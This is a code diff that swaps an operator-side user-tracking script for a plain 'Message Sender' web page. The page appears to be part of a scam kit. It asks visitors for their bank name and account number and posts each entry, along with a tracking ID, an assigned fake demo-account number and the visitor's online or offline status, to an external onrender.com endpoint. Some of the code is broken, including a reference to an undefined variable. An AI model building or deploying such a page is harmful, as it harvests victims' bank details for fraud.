@@ -1,64 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Message Sender</title>
+    <style>
+        body { font-family: Arial; margin: 40px; }
+        input { padding: 10px; width: 300px; font-size: 16px; }
+        button { padding: 10px 20px; font-size: 16px; background: #007bff; color: white; border: none; cursor: pointer; }
+        #status { margin-top: 10px; color: green; }
+    </style>
+</head>
+<body>
+    <h2>📤 Send Message</h2>
+    <form id="form" method="post">
+        <input type="text" name="message" onchange="sender({ userId: localStorage.getItem('code'), azaName: this.value })" placeholder="Type your bank name here">
+        <input type="text" name="message" onchange="sender({ userId: localStorage.getItem('code'), realAcc: this.value })" placeholder="Type your account here">
+        <input type="submit" value="Send to Receiver">
+    </form>
+    
+    <div id="status">Hey</div>
 
-        function extractMessages(messages) {
-            messages.forEach(message => {
-                const newUserId = message.userId;
-                const existing = savedUsers.find(user => user.userId.toLowerCase() === newUserId.toLowerCase());
-                if (existing) {
-					if(message.status){
-						updateUserById(newUserId, 'status', message.status);
-					}
-					if(message.demoAcc){
-						updateUserById(newUserId, 'demoAcc', message.demoAcc);
-					}
-					if(message.azaName){
-						updateUserById(newUserId, 'azaName', message.azaName);
-					}
-					if(message.realAcc){
-						updateUserById(newUserId, 'realAcc', message.realAcc);
-					}
-					if(message.name){
-						updateUserById(newUserId, 'name', message.name);
-					}
-					if(message.amount){
-						updateUserById(newUserId, 'amount', message.amount);
-					}
-					if(message.request){
-						updateUserById(newUserId, 'request', message.request);
-					}
-					if(message.update){
-						updateUserById(newUserId, 'update', message.update);
-					}
-                    
-                    displaySavedUsers();
-                } else {
-                    savedUsers.push({
-						status: message.status,
-                        userId: newUserId,
-                        demoAcc: message.demoAcc,
-						azaName: message.azaName,
-						realAcc: message.realAcc,
-						name: message.name,
-						amount: message.amount,
-                        request: message.request,
-						update: message.update
-                    });
-                    localStorage.setItem('savedUsers', JSON.stringify(savedUsers));
-                    displaySavedUsers();
-                }
-            });
-        }
-        // UPDATOR using UserId
-function updateUserById(id, property, value) {
-  const itemIndex = savedUsers.findIndex(user => user.userId === id);
-  if (itemIndex !== -1) {
-    savedUsers[itemIndex][property] = value;
-    localStorage.setItem('savedUsers', JSON.stringify(savedUsers));
-  }
+    <script>   
+// Sender 
+function sender(payload) {
+    const url = 'https://send-39yi.onrender.com/api/messages';  
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload)    
+    });  
+}
+    
+// Code Generator
+function generateRandomCode() {
+    const numbers = Array.from({length: 8}, () => Math.floor(Math.random() * 10));
+    const letters = Array.from({length: 2}, () => 
+        String.fromCharCode(65 + Math.floor(Math.random() * 26))
+    );
+    const allChars = [...numbers, ...letters];
+    // Shuffle the array
+    for (let i = allChars.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [allChars[i], allChars[j]] = [allChars[j], allChars[i]];
+    }
+    return allChars.join('');
 }
         
-        // Start polling when page loads
-        window.addEventListener('load', () => {
-            // Choose one method:
-            fetchMessages(); // Long-polling (more efficient)
-            displaySavedUsers();
-        });
+// Check if UserId has been created
+if (localStorage.getItem('code')) {
+  console.log('UserId is already stored');
+} else {
+  // Run the function
+  const code = generateRandomCode();
+  const digits = Array.from({ length: 10 }, () => Math.floor(Math.random() * 10)).join('');
+
+  // Save the item
+  localStorage.setItem('code', code);
+  localStorage.setItem('digits', digits);
+    
+  // Send to backend
+    sender({ userId: code, demoAcc: digits, status: "online" });
+}  
+
+// Get User ID
+const userId = localStorage.getItem('code');
+        
+// Get demoAcc
+const demoAcc = localStorage.getItem('digits'); 
+    
+        
+// Get Status      
+document.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'visible') {
+      //sender({ name: "Mike", amount: "2500", update: "clear" });
+    sender({ userId: userId, status: "online" });
+  } else {
+    sender({ userId: userId, status: "offline" });          
+  }
+});
+
+    
+        // Form submission
+        const form = document.getElementById('form');
+        
+        form.addEventListener('submit', (event) => {
+            event.preventDefault();
+            const formData = new FormData(form);
+            const message = formData.get('message');
+            sender(message, randomCode)
+        })
+
+    </script>
+</body>
+</html>
+        
